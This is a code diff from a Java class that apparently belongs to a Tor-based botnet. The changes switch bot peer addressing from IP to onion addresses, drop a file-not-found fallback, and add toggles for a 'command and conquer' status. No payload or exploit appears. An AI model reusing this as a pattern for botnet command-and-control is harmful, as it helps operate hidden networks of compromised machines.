@@ -97,7 +97,7 @@ public class NetworkService {
 	public List<Pairs<OnionAddress, PublicKey>> setConstructList(Set<Bot> botList) {
 		List<Pairs<OnionAddress, PublicKey>> buff = new ArrayList<Pairs<OnionAddress, PublicKey>>();
 		botList.forEach((bot) -> {
-			buff.add(new Pairs<OnionAddress, PublicKey>(new OnionAddress(bot.getIp()), pki.rebuildPuK(bot.getPubKey())));
+			buff.add(new Pairs<OnionAddress, PublicKey>(new OnionAddress(bot.getOnionAddress()), pki.rebuildPuK(bot.getPubKey())));
 		});
 		return buff;
 	}
@@ -108,7 +108,7 @@ public class NetworkService {
 	public List<Pairs<OnionAddress, PublicKey>> setConstructList(List<Bot> list) {
 		List<Pairs<OnionAddress, PublicKey>> buff = new ArrayList<Pairs<OnionAddress, PublicKey>>();
 		list.forEach((bot) -> {
-			buff.add(new Pairs<OnionAddress, PublicKey>(new OnionAddress(bot.getIp()), pki.rebuildPuK(bot.getPubKey())));
+			buff.add(new Pairs<OnionAddress, PublicKey>(new OnionAddress(bot.getOnionAddress()), pki.rebuildPuK(bot.getPubKey())));
 		});
 		return buff;
 	}
@@ -125,12 +125,9 @@ public class NetworkService {
 	 */
 	public Boolean loadMachineInfo() throws InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException, NoSuchAlgorithmException, NoSuchPaddingException, IOException {
 		ArrayList<String> netPar = new ArrayList<String>();
-		try{
+
 			netPar = cryptoUtils.decodeStringsFromFile("");
-		}catch (FileNotFoundException f){
-			cryptoUtils.encodeObjsToFile("", null);
-			netPar = cryptoUtils.decodeStringsFromFile("");
-		}
+
 
 		//TODO ip apparentemente eliminato valutare il reinserimento
 
@@ -446,8 +443,13 @@ public class NetworkService {
 		return rediret;
 	}
 
+	public void setCommandConquerStatus(boolean flag){
+		engineBot.setCommandandconquerStatus(flag);
+	}
 
-
+	public boolean isCommandandconquerStatus(){
+		return engineBot.isCommandandconquerStatus();
+	}
 
 	public boolean updateBotNetwork() {
 		return true;
